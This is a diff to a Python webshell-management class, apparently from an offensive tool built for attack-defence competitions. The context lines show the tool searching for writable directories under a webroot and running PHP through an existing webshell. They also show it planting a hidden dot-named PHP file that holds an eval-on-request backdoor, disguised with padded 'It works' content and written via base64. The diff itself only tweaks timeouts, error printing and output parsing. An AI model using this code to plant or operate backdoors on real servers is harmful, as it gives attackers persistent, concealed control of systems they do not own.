@@ -122,7 +122,7 @@ class WebShell():
         else:
             Log.error("Error occured! %s" % result[1])
         return result[1]
-        
+
     def get_writable_directory(self):
         command = "find %s -type d -writable" % (self.webroot)
         output = self.auto_exec(command)
@@ -170,6 +170,7 @@ class WebShell():
                     Log.error("\n%s\n" % (response.content))
                 except Exception as e:
                     error_content = str(e)
+                    print error_content
                     if "Read timed out" in error_content:
                         Log.success("Webshell actived! (%s)" % (error_content))
                         if writable_dir.startswith(self.webroot):
@@ -272,6 +273,8 @@ class WebShell():
             for i in content.split(token):
                 if i == flag:
                     return True
+            else:
+                content = ""
         if content != "":
             self.reason = "Invalid password (%s) %s" % (self.password, content)
         else:
@@ -299,7 +302,7 @@ class WebShell():
     def check_connection(self, url):
         Log.info("Checking the connection to the webshell...")
         try:
-            response = requests.head(url)
+            response = requests.head(url, timeout=3)
             code = response.status_code
             if code != 200:
                 Log.warning("The status code is %d, the webshell may have some problems..." % (response.status_code))
@@ -359,12 +362,15 @@ class WebShell():
         token = random_string(32, string.letters)
         code = 'echo "%s";%s;echo "%s";' % (token, code, token)
         result = self.php_code_exec(code)
-        if result[0]:
-            content = result[1]
-            return (True, content.split(token)[1])
+        if token in result[1]:
+            if result[0]:
+                content = result[1]
+                return (True, content.split(token)[1])
+            else:
+                content = "Time out!"
+                return (False, content)
         else:
-            content = "Time out!"
-            return (False, content)
+            return (False, result[1])
 
 
     def auto_exec_print(self, command):
@@ -622,7 +628,7 @@ class WebShell():
 
                 filename = ".%s.php" % (random_string(16, string.letters + string.digits))
                 password = (random_string(16, string.letters + string.digits))
-                
+
                 webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
                 fake_content = "<?php print_r('It works');?>"
                 padding = " " * (len(webshell_content) - len(fake_content))
@@ -631,7 +637,7 @@ class WebShell():
                 php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), content.encode("base64").replace("\n",""))
                 self.php_code_exec(php_code)
 
-                
+
                 if writable_dir.startswith(self.webroot):
                     path = writable_dir[len(self.webroot):]
                 else:
